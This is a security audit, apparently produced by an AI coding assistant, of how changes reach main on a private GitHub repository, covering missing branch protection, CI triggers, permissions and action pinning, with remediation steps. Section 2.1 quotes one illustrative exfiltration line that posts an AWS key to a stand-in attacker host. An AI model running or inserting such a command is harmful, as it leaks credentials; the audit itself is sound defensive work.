# Repo Protection Audit — pidchain

**Date:** 2026-04-25
**Auditor:** Claude Code (CC), reviewed against `gh api` results
**Scope:** How changes reach `main` on `jwyattgh/pidchain`, what `ci.yml` actually gates, and where the holes are vs. the threat model "anyone in the public can submit a change."

---

## TL;DR

Today, **CI is advisory only**. There is no GitHub-side gate that prevents a PR with failing CI from being merged into `main`, nor that prevents a direct push to `main`. This is not a misconfiguration of `ci.yml` — `ci.yml` is reasonable. It's a missing **branch protection / ruleset** layer, which on the current account plan + repo visibility is **not available to configure**.

The good news: today the repo is `private` with one collaborator (`jwyattgh`, admin), so the practical attack surface is `jwyattgh` themselves making a mistake. The threat model ("public can submit PRs") only opens up if/when the repo is made public — and going public **without** first establishing protection is the real cliff.

---

## 1. Current GitHub configuration (verified via `gh api`)

### 1.1 Repo

| Setting | Value | Source |
|---|---|---|
| Visibility | `private` | `repos/jwyattgh/pidchain` |
| Default branch | `main` | same |
| `main` `protected` flag | `false` | `repos/.../branches/main` |
| Branch protection API | **403 — "Upgrade to GitHub Pro or make this repository public"** | `repos/.../branches/main/protection` |
| Rulesets API | **403 — same message** | `repos/.../rulesets` |
| `allow_auto_merge` | `false` | repo |
| `allow_merge_commit` | `true` | repo |
| `allow_squash_merge` | `true` | repo |
| `allow_rebase_merge` | `true` | repo |
| `allow_forking` | `true` | repo |
| `delete_branch_on_merge` | `false` | repo |
| `web_commit_signoff_required` | `false` | repo |
| `required_signatures` | `null` | repo |
| `allow_update_branch` | `false` | repo |
| `security_and_analysis` | `null` | repo |
| `vulnerability-alerts` endpoint | `404` (Dependabot alerts not enabled) | `repos/.../vulnerability-alerts` |
| `automated-security-fixes` endpoint | `200` (enabled, but moot without alerts) | `repos/.../automated-security-fixes` |

### 1.2 Account / plan

| Setting | Value |
|---|---|
| Owner type | personal user (`jwyattgh`) |
| Plan visible via API | `null` (consistent with free; Pro/Team would show `plan.name`) |
| 403 messages from protection/ruleset endpoints | confirm not on a plan that supports private-repo protection |

**Implication:** On GitHub Free, branch protection rules and rulesets are **only available for public repositories**. Private repos on Free cannot configure them at all. This is a hard platform constraint, not a checkbox we missed.

### 1.3 Actions permissions

| Setting | Value | Notes |
|---|---|---|
| Actions enabled | `true` | |
| `allowed_actions` | `"all"` | any third-party action permitted |
| `sha_pinning_required` | `false` | floating tags (`@v4`) are accepted |
| `default_workflow_permissions` | `"read"` | good — least-privilege baseline |
| `can_approve_pull_request_reviews` | `false` | good — `GITHUB_TOKEN` cannot approve PRs |
| Reusable-workflow `access_level` | `"none"` | other repos cannot reuse these workflows |

### 1.4 People

- Collaborators: just `jwyattgh` (admin).
- No `CODEOWNERS` file (`.github/CODEOWNERS` does not exist).
- No teams (personal account).

---

## 2. What `ci.yml` actually does — review

The file at [.github/workflows/ci.yml](../.github/workflows/ci.yml) is reasonable on its own merits, and the design choices that matter for fork-PR safety are correct.

### 2.1 Triggers and threat-model implications

```yaml
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule: [ ... ]
  workflow_dispatch:
```

- Uses **`pull_request`** (not `pull_request_target`). For fork PRs from outside collaborators, this is the **safe** trigger:
  - The workflow runs against the PR's head ref in a sandboxed context.
  - Secrets are **not** injected (`secrets.*` is empty for fork PRs).
  - The `GITHUB_TOKEN` is downgraded to read-only regardless of declared `permissions:`.
- This means a hostile fork PR that adds `run: curl evil.example.com -d "$AWS_KEY"` cannot exfiltrate anything — there's nothing to exfiltrate. ✓
- The job-level `permissions:` blocks (e.g. `pull-requests: write` on `publish-test-results`) only apply when triggered by trusted contexts (push, scheduled, dispatch, or PRs from branches inside the repo). For fork PRs they are clamped to read.

### 2.2 Top-level permissions hardening

```yaml
permissions: {}
```

- Workflow-level default is empty. Each job re-declares the minimum it needs. ✓ This is the correct posture and matches `default_workflow_permissions: read` at repo level.

### 2.3 Action pinning

Every third-party action is pinned to a **floating major tag**, not a commit SHA:

| Action | Pin |
|---|---|
| `actions/checkout` | `@v4` |
| `actions/setup-go` | `@v5` |
| `actions/upload-artifact` | `@v4` |
| `actions/download-artifact` | `@v4` |
| `EnricoMi/publish-unit-test-result-action` | `@v2` |
| `golangci/golangci-lint-action` | `@v7` |
| `securego/gosec` | `@v2.25.0` (full version, but still a tag — moveable) |
| `github/codeql-action/upload-sarif` | `@v4` |
| `golang/govulncheck-action` | `@v1` |
| `codecov/codecov-action` | `@v5` |
| `softprops/action-gh-release` | `@v2` (release.yml) |

A floating tag can be force-moved by the action's owner, so a compromised maintainer account or a typosquatted release could ship malicious code into our CI on the next run. With `default_workflow_permissions: read` and no secrets exposed to fork PRs, the blast radius for `pull_request` runs is small. The blast radius is larger on `push: main`, scheduled runs, and `release.yml` (which has `contents: write`).

### 2.4 Secrets surface

- Codecov uses **OIDC** (`use_oidc: true`), not a static token. ✓
- `release.yml` has `contents: write` on the `release` job to publish releases — this is unavoidable, but it only triggers on `push tags: v*`, which only an admin can do.
- No other secrets are referenced.

### 2.5 What CI does and does not enforce

CI **does** enforce, on every PR and every push to main, that:
- Build, vet, race-tested unit tests pass on macOS / Windows / Ubuntu × Go 1.25 / 1.26.
- Per-OS coverage thresholds (95 / 95 / 91) are met.
- `golangci-lint v2.6.2` finds nothing.
- `gosec` finds zero issues (failure is enforced via `jq` count, regardless of `continue-on-error` on the scan step itself).
- `govulncheck` finds nothing.

CI **does not** enforce — and **cannot** enforce, by design — whether GitHub then **lets** a merge happen. That's the branch-protection layer's job, and it is currently absent.

---

## 3. The actual hole — branch protection is missing and unconfigurable

### 3.1 What "no protection" means in practice today

Because `main` has `protected: false`:

1. **`jwyattgh` (the only writer) can push directly to `main`.** No CI need run, no review need happen.
2. **A PR can be merged with red CI.** The merge button is not gated on status checks. CI is purely informational.
3. **Force-pushes to `main` are possible.** `git push --force origin main` will succeed.
4. **`main` could be deleted.** No protection against branch deletion.
5. **No required signed commits, linear history, or signoff.**
6. **No required reviewers.** A PR opened by `jwyattgh` can be self-merged immediately.

For a single-developer private repo this is the GitHub default, and the practical risk is bounded by "do I trust myself not to push bad code to main." Today, the answer is yes — but it is **not** what the user is concerned about.

### 3.2 What changes if the repo goes public on the same plan

Going public **does not** auto-add protection. It would, however, change two things:

- **Branch protection becomes configurable** (free for public repos). It just won't exist until someone creates it.
- **Anyone on the internet can fork and submit a PR.** They cannot push to `main`, and their CI runs are sandboxed (per §2.1), but there is still no gate that prevents the maintainer from clicking "merge" on a red PR — accidentally or otherwise.

So: making the repo public **without first staging a protection rule** is the cliff. CI alone is not a gatekeeper.

### 3.3 What is impossible until the plan or visibility changes

These cannot be configured today:

| Want | Today | Requires |
|---|---|---|
| Required status checks on `main` | ❌ | Public visibility OR Pro/Team plan |
| Required PR review count | ❌ | same |
| Block force-push to `main` | ❌ | same |
| Block deletion of `main` | ❌ | same |
| Required signed commits | ❌ | same |
| `CODEOWNERS`-required reviews | ❌ (file can exist; enforcement requires protection) | same |
| Restrict who can dismiss reviews | ❌ | same |
| Require linear history | ❌ | same |

---

## 4. Other gaps independent of branch protection

These can be fixed today, regardless of plan or visibility.

### 4.1 No `CODEOWNERS`

A `.github/CODEOWNERS` file would route review requests automatically. It does **not** enforce anything without branch protection, but creating it now means the protection rule (when enabled) can immediately reference it. Suggested minimal content:

```
*       @jwyattgh
```

### 4.2 Floating tags on third-party actions (§2.3)

Two reasonable strategies:

- **SHA-pin** every third-party action and let Dependabot bump them. Strongest supply-chain posture.
- **Enable `sha_pinning_required`** at the repo level (the Actions setting we observed as `false`). Forces SHA pins for any future changes.

Either choice should be deliberate; both are stricter than today's posture.

### 4.3 Dependabot alerts disabled

`vulnerability-alerts` returns 404. `automated-security-fixes` is enabled but cannot do anything without alerts. Either turn alerts on (`Settings → Code security and analysis → Dependabot alerts`) or accept that `govulncheck` in CI is the only vuln signal.

### 4.4 Outside-contributor approval for Actions

Because the repo is private with one collaborator, this is moot today. Once the repo is public, the relevant setting is `Settings → Actions → General → Approval for first-time contributors`. The recommended policy is **"Require approval for first-time contributors who are new to GitHub"** at minimum, and ideally **"Require approval for all outside collaborators"** to prevent CI from running on hostile PRs without a maintainer's explicit click.

### 4.5 `delete_branch_on_merge: false`

Hygiene, not security. With protection rules absent, dangling merged branches are noise rather than risk. Enable when convenient.

---

## 5. Recommended remediation order

Listed from **must-do-before-public** down to nice-to-have.

### P0 — before making the repo public (or right after)

1. **Decide plan + visibility.** Either:
   - Make the repo public (branch protection becomes free), or
   - Upgrade to GitHub Pro (~$4/mo) so the repo can stay private with protection.
2. **Create a branch protection rule (or ruleset) on `main` with at minimum:**
   - Require pull request before merging — ≥ 1 approving review.
   - Require status checks to pass — select these from `ci.yml`:
     - `Test (macos-latest, Go 1.26)`
     - `Test (windows-latest, Go 1.26)`
     - `Test (ubuntu-latest, Go 1.26)`
     - `Lint`
     - `Security scan`
     - `Vulnerability scan`
     - (Optionally: `Test (..., Go 1.25)` if 1.25 should be a release floor.)
   - Require branches to be up to date before merging.
   - Block force-pushes.
   - Block branch deletion.
   - Apply rules to administrators (otherwise `jwyattgh` can bypass them).
3. **Add `.github/CODEOWNERS`** and toggle "Require review from Code Owners" in the protection rule.
4. **Set Actions → General → Fork PR approval** to "Require approval for all outside collaborators."

### P1 — supply-chain hardening

5. SHA-pin third-party actions in `ci.yml` and `release.yml`, OR enable `sha_pinning_required` at the repo level.
6. Enable Dependabot alerts (alongside the existing Dependabot version updates and security fixes).

### P2 — hygiene

7. Enable `delete_branch_on_merge`.
8. Decide on `required_signatures` / `web_commit_signoff_required` based on contributor expectations.
9. Pick a single merge style (squash-only is the common default for public projects) and disable the others.

---

## 6. Summary answers to the original questions

> Is the `ci.yml` review accurate?

The `ci.yml` itself is reasonable for what a CI workflow can do — `pull_request` (not `pull_request_target`), `permissions: {}` at top, OIDC for Codecov, gosec/govulncheck/golangci-lint with hard failures, multi-OS matrix with coverage gates. The only `ci.yml`-internal gap is **floating action tags** (supply-chain risk), which is mitigated today by least-privilege `GITHUB_TOKEN` and no secrets on fork PRs.

> Are there holes in how the repo is configured?

Yes, and the dominant one is **structural, not in `ci.yml`**: there is no branch protection rule on `main`, and on the current Free plan + private visibility, none can be configured. CI is therefore advisory rather than a gate. Going public without first establishing protection would expose the project to merges of red PRs (by maintainer error or pressure). Going public **with** protection in place would be a defensible posture — fork PRs are sandboxed by GitHub, and merge would require both green required checks and an approving review.

> Will the public be able to merge changes automatically with no protections?

Not directly, no. The public can never push to `main` or self-merge a PR — only a user with `write` (currently just `jwyattgh`) can click merge. The risk is that, without branch protection, a maintainer **can** merge a PR that CI failed on, or push directly to `main` bypassing CI entirely. CI alone does not stop that; branch protection does.
